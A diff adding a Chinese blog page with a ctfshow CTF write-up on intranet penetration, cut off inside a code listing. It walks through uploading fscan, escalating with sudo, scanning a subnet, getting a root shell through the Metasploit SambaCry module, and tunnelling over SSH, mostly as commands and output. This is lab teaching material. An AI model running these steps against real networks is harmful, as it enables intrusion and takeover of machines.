@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="web859_有跳板机开启环境后用ssh连接一下 攻击机不出网，但是给了工具 问题是怎么扫内网ip呢？后面发现可以利用ssh传输fscan 1scp -P 28242 fscan ctfshow@pwn.challenge.ctf.show:&#x2F;tmp  传上去了，那我们扫一下内网 123456789101112131415161718$ whoamictfshow$ ifconfigeth0: f">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow入门内网渗透">
+<meta property="og:url" content="https://wanth3f1ag.top/2025/06/15/ctfshow%E5%85%A5%E9%97%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/index.html">
+<meta property="og:site_name" content="root@wanth3f1ag">
+<meta property="og:description" content="web859_有跳板机开启环境后用ssh连接一下 攻击机不出网，但是给了工具 问题是怎么扫内网ip呢？后面发现可以利用ssh传输fscan 1scp -P 28242 fscan ctfshow@pwn.challenge.ctf.show:&#x2F;tmp  传上去了，那我们扫一下内网 123456789101112131415161718$ whoamictfshow$ ifconfigeth0: f">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20250615201837630.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20250615212138558.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20250615213106421.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20250615214146718.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20250615214246659.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20250615214345087.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20250615221207242.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20250615221338406.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20250615221510399.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20250615221535580.png">
+<meta property="article:published_time" content="2025-06-15T12:11:05.000Z">
+<meta property="article:modified_time" content="2025-06-15T14:16:53.764Z">
+<meta property="article:author" content="wanTh3flag">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20250615201837630.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>ctfshow入门内网渗透</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">H0me</a></li><!--
+     --><!--
+       --><li><a href="/about/">A6out</a></li><!--
+     --><!--
+       --><li><a href="/tags/">T6gs</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Catagory</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">s4arch</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/06/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC3%E9%93%BE/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/06/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96URLDNS%E5%88%A9%E7%94%A8%E9%93%BE/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/06/15/ctfshow%E5%85%A5%E9%97%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/06/15/ctfshow%E5%85%A5%E9%97%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/&text=ctfshow入门内网渗透"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/06/15/ctfshow%E5%85%A5%E9%97%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/&title=ctfshow入门内网渗透"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/06/15/ctfshow%E5%85%A5%E9%97%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/&is_video=false&description=ctfshow入门内网渗透"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ctfshow入门内网渗透&body=Check out this article: https://wanth3f1ag.top/2025/06/15/ctfshow%E5%85%A5%E9%97%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/06/15/ctfshow%E5%85%A5%E9%97%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/&title=ctfshow入门内网渗透"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/06/15/ctfshow%E5%85%A5%E9%97%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/&title=ctfshow入门内网渗透"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/06/15/ctfshow%E5%85%A5%E9%97%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/&title=ctfshow入门内网渗透"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/06/15/ctfshow%E5%85%A5%E9%97%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/&title=ctfshow入门内网渗透"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/06/15/ctfshow%E5%85%A5%E9%97%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/&name=ctfshow入门内网渗透&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/06/15/ctfshow%E5%85%A5%E9%97%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/&t=ctfshow入门内网渗透"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web859-%E6%9C%89%E8%B7%B3%E6%9D%BF%E6%9C%BA"><span class="toc-number">1.</span> <span class="toc-text">web859_有跳板机</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        ctfshow入门内网渗透
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">wanTh3flag</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-06-15T12:11:05.000Z" class="dt-published" itemprop="datePublished">2025-06-15</time>
+        
+        (Updated: <time datetime="2025-06-15T14:16:53.764Z" class="dt-updated" itemprop="dateModified">2025-06-15</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/ctfshow/">ctfshow</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="web859-有跳板机"><a href="#web859-有跳板机" class="headerlink" title="web859_有跳板机"></a>web859_有跳板机</h2><p>开启环境后用ssh连接一下</p>
+<p>攻击机<strong>不出网</strong>，但是给了工具</p>
+<p>问题是怎么扫内网ip呢？后面发现可以利用ssh传输fscan</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -P 28242 fscan ctfshow@pwn.challenge.ctf.show:/tmp</span><br></pre></td></tr></table></figure>
+
+<p>传上去了，那我们扫一下内网</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ whoami</span><br><span class="line">ctfshow</span><br><span class="line">$ ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1450</span><br><span class="line">        inet 172.2.237.4  netmask 255.255.255.0  broadcast 172.2.237.255</span><br><span class="line">        ether 02:42:ac:02:ed:04  txqueuelen 0  (Ethernet)</span><br><span class="line">        RX packets 119  bytes 12212 (12.2 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 83  bytes 11563 (11.5 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>
+
+<p>但是这里权限太低了，看看能不能提权，本来以为需要查找sudo -l去提权的，结果只需要sudo su就行了，那么就来到了root权限</p>
+<p><img src="/../image/achieve/202411/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20250615201837630.png" alt="image-20250615201837630"></p>
+<p>给fscan权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x *</span><br></pre></td></tr></table></figure>
+
+<p>然后开始扫内网</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">root@shell:/tmp<span class="meta"># ./fscan -h 172.2.203.0/24</span></span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /</span></span><br><span class="line"><span class="string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span></span><br><span class="line"><span class="string">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span></span><br><span class="line"><span class="string">                     fscan version: 1.8.4</span></span><br><span class="line"><span class="string">start infoscan</span></span><br><span class="line"><span class="string">(icmp) Target 172.2.203.4     is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.2.203.1     is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.2.203.5     is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.2.203.6     is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.2.203.7     is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.2.203.2     is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.2.203.3     is alive</span></span><br><span class="line"><span class="string">[*] Icmp alive hosts len is: 7</span></span><br><span class="line"><span class="string">172.2.203.6:445 open</span></span><br><span class="line"><span class="string">172.2.203.4:22 open</span></span><br><span class="line"><span class="string">172.2.203.6:139 open</span></span><br><span class="line"><span class="string">172.2.203.5:9000 open</span></span><br><span class="line"><span class="string">172.2.203.5:80 open</span></span><br><span class="line"><span class="string">[*] alive ports len is: 5</span></span><br><span class="line"><span class="string">start vulscan</span></span><br><span class="line"><span class="string">[+] FCGI 172.2.203.5:9000 </span></span><br><span class="line"><span class="string">Status: 403 Forbidden</span></span><br><span class="line"><span class="string">X-Powered-By: PHP/7.3.22</span></span><br><span class="line"><span class="string">Content-type: text/html; charset=UTF-8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Access denied.</span></span><br><span class="line"><span class="string">stderr:Access to the script &#x27;</span>/etc/issue<span class="string">&#x27; has been denied (see security.limit_extensions)</span></span><br><span class="line"><span class="string">plesa try other path,as -path /www/wwwroot/index.php</span></span><br><span class="line"><span class="string">[*] OsInfo 172.2.203.6  (Windows 6.1)</span></span><br><span class="line"><span class="string">[*] NetBios 172.2.203.6     oa                                  Windows 6.1</span></span><br><span class="line"><span class="string">[*] WebTitle http://172.2.203.5        code:200 len:2880   title:欢迎登陆CTFshow文件管理系统</span></span><br><span class="line"><span class="string">[+] PocScan http://172.2.203.5 poc-yaml-php-cgi-cve-2012-1823 </span></span><br></pre></td></tr></table></figure>
+
+<p>看到172.2.203.6开放了445端口，猜测有Samba服务，用msf中的辅助模块**<code>auxiliary/scanner/smb/smb_version</code>**检测一下Samba的版本以及是否存在漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/smb/smb_version</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_version) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/smb/smb_version):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com</span><br><span class="line">                                       /docs/using-metasploit/basics/using-metasploit.html</span><br><span class="line">   THREADS  1                yes       The number of concurrent threads (max one per host)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d command.</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/smb/smb_version) &gt; set rhosts 172.2.237.6</span><br><span class="line">rhosts =&gt; 172.2.237.6</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_version) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 172.2.237.6:445       - SMB Detected (versions:1, 2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:) (encryption capabilities:AES-128-CCM) (signatures:optional) (guid:&#123;0000616f-0000-0000-0000-000000000000&#125;) (authentication domain:OA)</span><br><span class="line">[*] 172.2.237.6:445       -   Host could not be identified: Windows 6.1 (Samba 4.6.3)</span><br><span class="line">[*] 172.2.237.6:          - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
+
+<p>可以看到这里有用到旧协议，我们可以试着打一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(linux/samba/is_known_pipename) &gt; use exploit/linux/samba/is_known_pipename</span><br><span class="line">[*] Using configured payload cmd/unix/interact</span><br><span class="line">msf6 exploit(linux/samba/is_known_pipename) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/samba/is_known_pipename):</span><br><span class="line"></span><br><span class="line">   Name            Current Setting  Required  Description</span><br><span class="line">   ----            ---------------  --------  -----------</span><br><span class="line">   RHOSTS                           yes       The target host(s), see https://docs.metaspl</span><br><span class="line">                                              oit.com/docs/using-metasploit/basics/using-m</span><br><span class="line">                                              etasploit.html</span><br><span class="line">   RPORT           445              yes       The SMB service port (TCP)</span><br><span class="line">   SMB_FOLDER                       no        The directory to use within the writeable SM</span><br><span class="line">                                              B share</span><br><span class="line">   SMB_SHARE_NAME                   no        The name of the SMB share containing a write</span><br><span class="line">                                              able directory</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (cmd/unix/interact):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic (Interact)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d command.</span><br><span class="line"></span><br><span class="line">msf6 exploit(linux/samba/is_known_pipename) &gt; set rhosts 172.2.237.6</span><br><span class="line">rhosts =&gt; 172.2.237.6</span><br><span class="line">msf6 exploit(linux/samba/is_known_pipename) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 172.2.237.6:445 - Using location \\172.2.237.6\myshare\ for the path</span><br><span class="line">[*] 172.2.237.6:445 - Retrieving the remote path of the share &#x27;myshare&#x27;</span><br><span class="line">[*] 172.2.237.6:445 - Share &#x27;myshare&#x27; has server-side path &#x27;/home/share</span><br><span class="line">[*] 172.2.237.6:445 - Uploaded payload to \\172.2.237.6\myshare\ZdrCXlDR.so</span><br><span class="line">[*] 172.2.237.6:445 - Loading the payload from server-side path /home/share/ZdrCXlDR.so using \\PIPE\/home/share/ZdrCXlDR.so...</span><br><span class="line">[-] 172.2.237.6:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">[*] 172.2.237.6:445 - Loading the payload from server-side path /home/share/ZdrCXlDR.so using /home/share/ZdrCXlDR.so...</span><br><span class="line">[+] 172.2.237.6:445 - Probe response indicates the interactive payload was loaded...</span><br><span class="line">[*] Found shell.</span><br><span class="line">[*] Command shell session 1 opened (172.2.237.4:45913 -&gt; 172.2.237.6:445) at 2025-06-15 20:40:50 +0800</span><br><span class="line"></span><br><span class="line">ls</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<p>出来了，我以为打不通来着，那我们换成bash的shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">root@oa:/tmp<span class="comment"># cd /</span></span><br><span class="line">cd /</span><br><span class="line">root@oa:/<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line"><span class="built_in">bin</span>   dev  home  lib64  mnt  proc  run   srv  tmp  var</span><br><span class="line">boot  etc  lib   media  opt  root  sbin  sys  usr</span><br><span class="line">root@oa:/<span class="comment"># cd /toor</span></span><br><span class="line">cd /toor</span><br><span class="line">bash: cd: /toor: No such file <span class="keyword">or</span> directory</span><br><span class="line">root@oa:/<span class="comment"># cd /root</span></span><br><span class="line">cd /root</span><br><span class="line">root@oa:/root<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">flag.txt</span><br><span class="line">root@oa:/root<span class="comment"># cat flag.txt</span></span><br><span class="line">cat flag.txt</span><br><span class="line">ctfshow&#123;e7899cb3-53b6-<span class="number">4e01</span>-b8c8-5b4cf7e88368&#125;</span><br><span class="line">root@oa:/root<span class="comment"># </span></span><br></pre></td></tr></table></figure>
+
+<p>成功拿到flag</p>
+<p>这里的话也可以发现172.2.203.5开放了80端口，但是靶机不出网，需要进行内网穿透，我们可以搭建ssh隧道</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -L (本地端口):(目标主机ip):(目标主机端口) (跳板机用户名)@(跳板机ip) -p (跳板机端口)</span><br><span class="line">ssh -L 8085:172.2.68.5:80 ctfshow@pwn.challenge.ctf.show -p 28245</span><br></pre></td></tr></table></figure>
+
+<p>然后访问<code>http://127.0.0.1:8085/</code>就可以出来了</p>
+<p><img src="/../image/achieve/202411/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20250615212138558.png" alt="image-20250615212138558"></p>
+<p>刚刚fscan扫出来一个cve-2012-1823，可以参考P牛的文章：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-cgi-cve-2012-1823.html">https://www.leavesongs.com/PENETRATION/php-cgi-cve-2012-1823.html</a></p>
+<p>在页面右下角的<strong>CTFshow文件管理系统</strong>发现源码泄露，我们下载下来分析一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span 